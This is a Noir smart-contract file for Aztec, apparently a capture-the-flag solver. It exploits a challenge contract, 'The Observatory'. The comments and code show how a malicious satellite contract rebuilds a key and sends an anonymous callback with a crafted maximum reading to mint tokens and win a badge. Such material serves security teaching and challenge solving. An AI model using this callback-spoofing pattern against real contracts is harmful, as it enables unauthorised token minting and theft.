// TheObservatory Solver -- Malicious Satellite
//
// Exploits the Observatory's observe_shk_6237885 flow by implementing the
// StellarInterface (consume_shk_6237885) and reporting back a crafted reading
// through the dark-band channel using an anonymous public call.
//
// Attack vector:
// 1. The caller passes their OWN address as `target` when calling observe_shk_6237885.
// 2. The Observatory computes key = poseidon2_hash([caller, satellite, caller]).
// 3. The Observatory calls this satellite's consume_shk_6237885(target=caller, scan_depth).
// 4. This satellite reconstructs the same key using target for both caller and target slots.
// 5. It enqueues an ANONYMOUS public call to report_reading_shk_6237885 with a max reading.
// 6. The caller then calls retrieve() to mint tokens and earn the OBSERVE badge.
//
use aztec::macros::aztec;

#[aztec]
pub contract TheObservatorySolver {
    use aztec::{
        macros::functions::external,
        protocol::{
            abis::function_selector::FunctionSelector,
            hash::{poseidon2_hash, poseidon2_hash_bytes},
            traits::ToField,
        },
    };

    // Implements the StellarInterface's consume_shk_6237885.
    // Called by the Observatory during observe_shk_6237885.
    // Reports back anonymously with a crafted reading.
    #[external("private")]
    fn consume_shk_6237885(mass_origin: Field, flux_density: Field) {
        // msg_sender is the Observatory (it called us)
        let observatory = self.msg_sender();

        // Reconstruct the observation key.
        // The caller passed their own address as `target`, so mass_origin = caller address.
        // key = poseidon2_hash([caller, satellite, target]) = poseidon2_hash([mass_origin, self, mass_origin])
        let satellite = self.context.this_address();
        let key = poseidon2_hash([mass_origin, satellite.to_field(), mass_origin]);

        // Enqueue an ANONYMOUS public call to the Observatory's report_reading_shk_6237885.
        // hide_msg_sender=true makes maybe_msg_sender() return None on the receiving end,
        // satisfying the "dark-band reports must be anonymous" check.
        let selector = comptime {
            FunctionSelector::from_signature("report_reading_shk_6237885(Field,Field)")
        };
        self.context.call_public_function(observatory, selector, [key, flux_density], true);
    }

    // Utility: returns the WAVELENGTH_SLOT constant used by TheObservatory for capsules.
    #[external("utility")]
    unconstrained fn get_wavelength_slot() -> Field {
        poseidon2_hash_bytes("WAVELENGTH_SLOT".as_bytes())
    }
}
